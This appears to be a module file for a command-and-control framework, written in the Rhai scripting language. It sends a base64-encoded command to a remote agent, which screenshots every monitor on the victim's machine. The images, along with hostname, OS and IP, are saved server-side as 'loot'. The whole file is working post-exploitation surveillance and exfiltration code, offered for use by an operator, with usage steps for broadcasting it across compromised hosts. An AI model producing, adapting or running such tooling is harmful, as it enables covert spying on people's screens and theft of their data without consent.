// modules/screenshot.rhai
//
// Captures all monitors on the agent and saves the images server-side
// into the downloads folder (same as the panel Screenshot button does).
//
// Usage:
//   • Panel → Listeners → Auto-Recon → Module tab → select "screenshot" → Add
//   • Panel → Sessions → host row → Scripts dropdown → screenshot → Run
//   • Broadcast → Module → screenshot
//
// What happens:
//   1. This module sends an ext:load command to the agent.
//   2. The agent runs the embedded Rhai script which calls internal_screenshot()
//      — a native function that captures every monitor and returns JSON.
//   3. The output is prefixed with SCREENSHOT_DUMP: so the server intercepts it,
//      saves monitor_N.png files into downloads/{ts}_{sessid}_screenshot/,
//      and writes a metadata.json with hostname, OS, IP, and file list.
//   4. The images are immediately browsable in the Loot tab.

fn run(session_id) {
    // Agent-side Rhai (base64 so the server sends it as a single command token):
    //   let result = internal_screenshot(); "SCREENSHOT_DUMP:" + result
    let b64 = "bGV0IHJlc3VsdCA9IGludGVybmFsX3NjcmVlbnNob3QoKTsgIlNDUkVFTlNIT1RfRFVNUDoiICsgcmVzdWx0";

    let cmd = "ext:load " + b64;
    let status = send_c2_command(session_id, cmd);

    print("Screenshot queued for session " + session_id + " — status: " + status);
    "Screenshot queued"
}
